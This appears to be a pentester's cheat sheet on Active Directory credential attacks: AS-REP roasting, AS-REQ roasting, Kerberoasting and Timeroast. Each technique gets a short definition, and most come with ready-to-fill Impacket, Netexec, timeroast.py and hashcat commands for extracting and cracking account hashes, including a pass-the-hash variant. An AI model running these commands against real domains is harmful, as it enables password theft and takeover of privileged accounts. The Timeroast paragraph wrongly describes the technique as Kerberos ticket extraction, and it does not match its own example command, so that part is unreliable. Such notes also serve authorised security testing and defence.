# Asreproast

AS-REP Roasting (short technical definition):
An offline credential-extraction attack that targets accounts with Kerberos pre-authentication disabled. An attacker requests an AS‑REQ for such a user, receives an AS‑REP containing an encrypted authentication blob protected by the user’s key (derived from their password), extracts that blob and performs offline cracking (e.g. brute‑force or dictionary) to recover the user’s plaintext password or key.

Impacket -> `GetNPUsers.py <domain>/ -usersfile <file with usernames> -format hashcat -outputfile <outfile with hashes>`

Netexec -> `nxc ldap <ip/machine.domain> -u <users list> -p '' --asreproast <outfile with hashes>`

<br>

# AsreQroast

Theoreticaly allows you to extract user hash from a .pcap file if contains an AS_REQ message (I didn't test it). More information can be found here:

https://www.thehacker.recipes/ad/movement/kerberos/asreqroast

https://github.com/lgandx/PCredz

<br>

# Kerberoast

An offline attack that targets Active Directory service accounts with a registered SPN. An attacker requests a service ticket (TGS) for the SPN, extracts the ticket’s encrypted service-ticket blob (encrypted with the service account’s key derived from its password), and performs offline cracking against that blob to recover the account’s plaintext password or key.

Impacket -> `GetUserSPNs.py -dc-ip <ip/machine.domain> '<domain>/<user>:<password>' -outputfile <outfile with hashes>`

Impacket pass-the-hash -> `GetUserSPNs.py -dc-ip <ip/machine.domain> '<domain>/<user>:' -outputfile <outfile with hashes> -hashes :<nthash>`

Netexec -> `nxc ldap <ip/machine.domain> -u <users list> -p <password/ -H hash> --kerberoasting <outfile with hashes>`

<br>

# Timeroast

Timeroast is an Active Directory attack technique that targets Kerberos authentication by extracting service tickets (TGS) for accounts with Service Principal Names (SPNs). Normally machine accounts. These tickets are encrypted with the service account’s NT hash, which the attacker can capture and crack offline using brute force or dictionary attacks. The goal is to recover the service account’s password, which often has high privileges and rarely changes.

Example:

`python3 timeroast.py <dc_ip> > hashs ; hashcat -m 31300 -a 0 hashs rockyou.txt --username`

https://github.com/SecuraBV/Timeroast/tree/main
